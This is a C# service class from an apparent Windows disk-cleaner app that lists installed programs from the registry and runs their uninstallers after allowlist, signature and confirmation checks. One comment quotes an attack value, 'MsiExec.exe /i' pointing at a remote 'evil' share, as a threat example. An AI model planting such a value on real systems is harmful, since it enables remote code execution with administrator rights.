using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using DiskCleaner.Helpers;
using DiskCleaner.Models;
using Microsoft.Win32;

namespace DiskCleaner.Services
{
    /// <summary>
    /// 软件管理服务
    /// 从注册表读取已安装软件列表，支持调用卸载程序
    /// </summary>
    public class SoftwareManager
    {
        public Action<int, string> OnProgress { get; set; }

        // 注册表卸载信息路径
        private static readonly string[] UninstallKeys =
        {
            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        };

        /// <summary>
        /// 获取已安装软件列表
        /// </summary>
        public async Task<List<SoftwareInfo>> GetInstalledSoftwareAsync(CancellationToken ct = default)
        {
            OnProgress?.Invoke(0, "正在读取已安装软件列表...");

            var result = new List<SoftwareInfo>();
            var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            await Task.Run(() =>
            {
                foreach (var keyPath in UninstallKeys)
                {
                    ct.ThrowIfCancellationRequested();

                    // HKLM (64位视图)
                    using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                    using (var key = baseKey.OpenSubKey(keyPath))
                    {
                        if (key != null)
                            ReadSubKeys(key, result, seen, ct);
                    }

                    // HKLM (32位视图 on 64位系统)
                    using (var baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32))
                    using (var key = baseKey.OpenSubKey(keyPath))
                    {
                        if (key != null)
                            ReadSubKeys(key, result, seen, ct);
                    }

                    // HKCU (当前用户安装的)
                    using (var key = Registry.CurrentUser.OpenSubKey(keyPath))
                    {
                        if (key != null)
                            ReadSubKeys(key, result, seen, ct);
                    }
                }
            }, ct);

            // 按名称排序
            result.Sort((a, b) => string.Compare(a.Name, b.Name, StringComparison.OrdinalIgnoreCase));

            OnProgress?.Invoke(100, $"共 {result.Count} 个已安装软件");
            return result;
        }

        private void ReadSubKeys(RegistryKey parentKey, List<SoftwareInfo> result, HashSet<string> seen, CancellationToken ct)
        {
            foreach (var subKeyName in parentKey.GetSubKeyNames())
            {
                ct.ThrowIfCancellationRequested();
                try
                {
                    using (var subKey = parentKey.OpenSubKey(subKeyName))
                    {
                        if (subKey == null) continue;

                        // 读取 SystemComponent 标记（系统组件不展示）
                        var systemComponent = subKey.GetValue("SystemComponent");
                        if (systemComponent != null && (int)systemComponent == 1) continue;

                        // 读取 ParentKeyName（更新补丁不展示）
                        var parentName = subKey.GetValue("ParentKeyName");
                        if (parentName != null) continue;

                        var name = subKey.GetValue("DisplayName") as string;
                        if (string.IsNullOrEmpty(name)) continue;

                        // 去重
                        if (seen.Contains(name)) continue;
                        seen.Add(name);

                        var info = new SoftwareInfo
                        {
                            Name = name,
                            Publisher = subKey.GetValue("Publisher") as string ?? "",
                            Version = subKey.GetValue("DisplayVersion") as string ?? "",
                            InstallDate = subKey.GetValue("InstallDate") as string ?? "",
                            InstallLocation = subKey.GetValue("InstallLocation") as string ?? "",
                            UninstallString = subKey.GetValue("UninstallString") as string ??
                                             subKey.GetValue("QuietUninstallString") as string ?? "",
                            EstimatedSizeKB = ParseEstimatedSize(subKey.GetValue("EstimatedSize"))
                        };

                        result.Add(info);
                    }
                }
                catch { /* 跳过无权限的键 */ }
            }
        }

        private long ParseEstimatedSize(object val)
        {
            if (val == null) return 0;
            if (val is int i) return i; // EstimatedSize 单位是 KB
            if (val is long l) return l;
            if (long.TryParse(val.ToString(), out long result)) return result;
            return 0;
        }

        /// <summary>
        /// 卸载指定软件
        /// </summary>
        public bool Uninstall(SoftwareInfo software)
        {
            if (string.IsNullOrEmpty(software.UninstallString))
            {
                OnProgress?.Invoke(100, $"无法卸载 {software.Name}：未找到卸载命令");
                return false;
            }

            try
            {
                // 用系统 API 正确解析命令行（正确处理引号与空格），避免 "C:\Program Files\A\u.exe"
                // 被错误切分为 fileName="C:\Program.exe"
                if (!TryParseCommandLine(software.UninstallString.Trim(), out var fileName, out var arguments))
                {
                    OnProgress?.Invoke(100, $"无法解析卸载命令：{software.Name}");
                    return false;
                }

                bool isMsi = Path.GetFileName(fileName).Equals("msiexec.exe", StringComparison.OrdinalIgnoreCase);
                string resolvedFile = fileName;
                if (isMsi)
                {
                    // MsiExec 是系统信任的卸载器，使用系统目录中的真实文件
                    resolvedFile = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.System), "msiexec.exe");
                }
                else
                {
                    try { resolvedFile = Path.GetFullPath(fileName); }
                    catch { resolvedFile = fileName; }
                }

                // MsiExec 参数严格白名单：只允许 /X{GUID} 或 /uninstall <本地.msi>
                if (isMsi && !IsSafeMsiUninstall(arguments))
                {
                    OnProgress?.Invoke(100, $"已拒绝卸载 {software.Name}：MsiExec 参数不在安全白名单内");
                    return false;
                }

                OnProgress?.Invoke(50, $"正在验证卸载程序：{software.Name}");

                // MsiExec 仍需校验参数（禁止 /i /package 等安装动作与远程目标），
                // 否则 HKCU 写入 "MsiExec.exe /i \\\\evil\\a.msi" 可由管理员点击触发 RCE
                if (isMsi)
                {
                    // 合法 MsiExec 仍需显式确认，且默认选“否”
                    var msiConfirm = System.Windows.MessageBox.Show(
                        $"即将以管理员权限运行 msiexec 来卸载“{software.Name}”。\n\n" +
                        $"命令：msiexec {arguments}\n\n是否继续？",
                        "安全确认 — DiskCleaner Pro",
                        System.Windows.MessageBoxButton.YesNo,
                        System.Windows.MessageBoxImage.Warning,
                        System.Windows.MessageBoxResult.No);
                    if (msiConfirm != System.Windows.MessageBoxResult.Yes)
                    {
                        OnProgress?.Invoke(100, $"已取消卸载：{software.Name}");
                        return false;
                    }
                }
                else
                {
                    bool trusted = File.Exists(resolvedFile) && IsTrustworthyUninstaller(resolvedFile);
                    if (!trusted)
                    {
                        var result = System.Windows.MessageBox.Show(
                            $"卸载程序未通过安全校验：\n\n{resolvedFile}\n\n" +
                            "它可能不在受信任目录中或缺少有效的数字签名（可能已被篡改）。是否仍要执行？",
                            "安全警告 — DiskCleaner Pro",
                            System.Windows.MessageBoxButton.YesNo,
                            System.Windows.MessageBoxImage.Warning,
                            System.Windows.MessageBoxResult.No);
                        if (result != System.Windows.MessageBoxResult.Yes)
                        {
                            OnProgress?.Invoke(100, $"已取消卸载：{software.Name}");
                            return false;
                        }
                    }
                }

                OnProgress?.Invoke(70, $"正在启动卸载程序：{software.Name}");

                if (!ElevationHelper.UninstallElevated(software.UninstallString))
                {
                    OnProgress?.Invoke(100, $"卸载失败或已取消：{software.Name}");
                    return false;
                }

                OnProgress?.Invoke(100, $"已启动卸载程序：{software.Name}");
                return true;
            }
            catch (Exception ex)
            {
                OnProgress?.Invoke(100, $"卸载失败：{ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// 在文件资源管理器中打开软件安装目录
        /// </summary>
        public bool OpenInstallLocation(SoftwareInfo software)
        {
            if (string.IsNullOrEmpty(software.InstallLocation))
            {
                OnProgress?.Invoke(100, $"未找到安装目录：{software.Name}");
                return false;
            }

            if (ExplorerHelper.OpenFolder(software.InstallLocation))
                return true;

            OnProgress?.Invoke(100, $"无法打开安装目录：{software.Name}");
            return false;
        }

        /// <summary>
        /// 用 Windows 命令行解析 API 切分卸载命令，正确处理引号与空格。
        /// 返回 fileName（第 0 个参数）与剩余 arguments。
        /// </summary>
        private static bool TryParseCommandLine(string commandLine, out string fileName, out string arguments)
        {
            fileName = null;
            arguments = null;
            if (string.IsNullOrWhiteSpace(commandLine)) return false;

            IntPtr ptr = NativeMethods.CommandLineToArgvW(commandLine, out int argc);
            if (ptr != IntPtr.Zero && argc > 0)
            {
                try
                {
                    var argv = new IntPtr[argc];
                    Marshal.Copy(ptr, argv, 0, argc);
                    fileName = Marshal.PtrToStringUni(argv[0]);
                    var sb = new System.Text.StringBuilder();
                    for (int i = 1; i < argc; i++)
                        sb.Append(Marshal.PtrToStringUni(argv[i])).Append(' ');
                    arguments = sb.ToString().Trim();
                    return !string.IsNullOrEmpty(fileName);
                }
                finally
                {
                    NativeMethods.LocalFree(ptr);
                }
            }

            // 回退：API 不可用时的简单解析
            var trimmed = commandLine.Trim();
            if (trimmed.StartsWith("\""))
            {
                int q = trimmed.IndexOf('"', 1);
                if (q > 0)
                {
                    fileName = trimmed.Substring(1, q - 1);
                    arguments = trimmed.Substring(q + 1).Trim();
                    return true;
                }
            }
            var parts = trimmed.Split(new[] { ' ' }, 2);
            fileName = parts[0];
            arguments = parts.Length > 1 ? parts[1] : "";
            return true;
        }

        /// <summary>
        /// 卸载程序必须位于受信任目录且具备有效 Authenticode 数字签名
        /// </summary>
        private static bool IsTrustworthyUninstaller(string path)
        {
            if (string.IsNullOrEmpty(path) || !File.Exists(path)) return false;

            string fullPath;
            try { fullPath = Path.GetFullPath(path); }
            catch { return false; }

            var dir = Path.GetDirectoryName(fullPath) ?? "";
            var trustedRoots = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.Windows)
            };
            bool inTrusted = trustedRoots.Any(r =>
                !string.IsNullOrEmpty(r) &&
                (dir.StartsWith(r, StringComparison.OrdinalIgnoreCase) ||
                 fullPath.StartsWith(r, StringComparison.OrdinalIgnoreCase)));
            if (!inTrusted) return false;

            return NativeMethods.IsAuthenticodeSigned(fullPath);
        }

        /// <summary>
        /// 严格校验 MsiExec 参数：仅允许 /X{GUID} 或 /uninstall <本地.msi>，
        /// 任何其他动作、额外开关、远程目标一律拒绝。
        /// </summary>
        private static bool         IsSafeMsiUninstall(string msiArgs)
        {
            if (string.IsNullOrWhiteSpace(msiArgs)) return false;

            var ptr = NativeMethods.CommandLineToArgvW(msiArgs.Trim(), out int argc);
            if (ptr == IntPtr.Zero || argc == 0) return false;
            try
            {
                var argv = new IntPtr[argc];
                Marshal.Copy(ptr, argv, 0, argc);
                var tokens = new List<string>(argc);
                for (int i = 0; i < argc; i++)
                    tokens.Add(Marshal.PtrToStringUni(argv[i]));

                // 形式一：动作与目标连写，如 /X{GUID}（仅一个 token，注册表常见形态）
                if (tokens.Count == 1)
                {
                    return System.Text.RegularExpressions.Regex.IsMatch(
                        tokens[0] ?? "",
                        @"^[-/][xX]\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$");
                }

                // 形式二：动作与目标分开，必须恰好两个 token（拒绝任何多余开关）
                if (tokens.Count == 2)
                {
                    var action = tokens[0].ToLowerInvariant();
                    var target = tokens[1].Trim('"', '\'');
                    if (action == "/x" || action == "-x") return IsGuid(target);
                    if (action == "/uninstall" || action == "-uninstall") return IsLocalMsiPath(target);
                }

                return false;
            }
            finally
            {
                NativeMethods.LocalFree(ptr);
            }
        }

        private static bool IsGuid(string s)
        {
            return System.Text.RegularExpressions.Regex.IsMatch(
                s ?? "", @"^\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$");
        }

        private static bool IsLocalMsiPath(string s)
        {
            if (string.IsNullOrEmpty(s)) return false;
            if (s.StartsWith("\\\\")) return false;
            if (s.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                s.StartsWith("https://", StringComparison.OrdinalIgnoreCase) ||
                s.StartsWith("ftp://", StringComparison.OrdinalIgnoreCase))
                return false;
            if (!s.EndsWith(".msi", StringComparison.OrdinalIgnoreCase)) return false;
            return System.Text.RegularExpressions.Regex.IsMatch(s, @"^[A-Za-z]:\\");
        }
    }
}
